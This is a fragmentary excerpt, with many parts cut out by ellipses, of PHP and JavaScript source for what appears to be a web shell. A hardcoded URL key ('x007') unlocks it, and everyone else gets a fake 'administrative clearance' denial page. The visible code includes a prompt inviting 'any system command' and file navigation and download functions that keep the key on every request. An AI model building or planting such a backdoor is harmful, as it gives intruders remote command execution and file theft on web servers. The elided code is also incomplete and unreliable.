...
$access_key = 'x007';
if (!isset($_GET['key']) && !isset($_SESSION['access_granted'])) {
    die("<style>body{background:#000;color:red;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:2rem;font-weight:bold;}</style>You do not have the administrative clearance required to decrypt or view this Page");
}
...
Type 'help' for hints or any system command to begin.</div>
    ...
    <script>
        ...
        function navigateTo(path) { 
            ...
            if (key) {
                form.action = window.location.pathname + '?key=' + key;
            }
        ...
        function downloadFile(path) { 
            ...
            if (key) form.action = window.location.pathname + '?key=' + key;
        ...
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => {
                // Ensure the key is preserved on form submits if present in GET
                const url = new URL(window.location.href);
                const key = url.searchParams.get('key');
                if (key && !f.id.includes('navigation') && !f.id.includes('download')) {
                    const action = f.getAttribute('action') || window.location.pathname;
                    if (!action.includes('?')) {
                        f.setAttribute('action', action + '?key=' + key);
